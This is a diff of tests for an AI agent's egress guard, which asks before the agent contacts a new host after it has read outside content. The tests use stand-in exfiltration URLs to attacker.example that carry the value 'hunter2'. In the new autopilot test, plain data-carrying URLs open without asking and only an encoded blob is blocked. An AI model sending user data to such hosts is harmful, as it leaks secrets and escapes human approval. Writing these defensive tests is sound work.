@@ -138,13 +138,23 @@ async def test_before_any_outside_read_urls_open_freely(tmp_path):
     assert asked == []
 
 
-async def test_after_a_read_a_new_host_needs_a_yes_even_in_autopilot(tmp_path):
-    ex, asked = make(tmp_path, autonomy="autopilot")
+async def test_after_a_read_a_new_host_needs_a_yes_up_to_trusted(tmp_path):
+    ex, asked = make(tmp_path, autonomy="trusted")
     await taint(ex, tmp_path)
     for tool in ("fetch_page", "browser_open"):
         r = await ex.execute(tool, {"url": f"https://attacker.example/{tool}?d=hunter2"}, "t1")
         assert not r.ok and "DENIED" in r.output
     assert len(asked) == 2 and "new site" in asked[0].reason and "attacker.example" in asked[0].reason
+
+
+async def test_autopilot_opens_a_plain_new_host_but_not_one_carrying_data(tmp_path):
+    ex, asked = make(tmp_path, autonomy="autopilot")
+    await taint(ex, tmp_path)
+    for tool in ("fetch_page", "browser_open"):
+        assert (await ex.execute(tool, {"url": f"https://attacker.example/{tool}?d=hunter2"}, "t1")).ok
+    assert asked == []
+    assert not (await ex.execute("fetch_page", {"url": f"https://attacker2.example/?d={BLOB}"}, "t1")).ok
+    assert len(asked) == 1 and "encoded value" in asked[0].reason
 
 
 async def test_open_target_urls_are_guarded_but_folders_are_not(tmp_path):
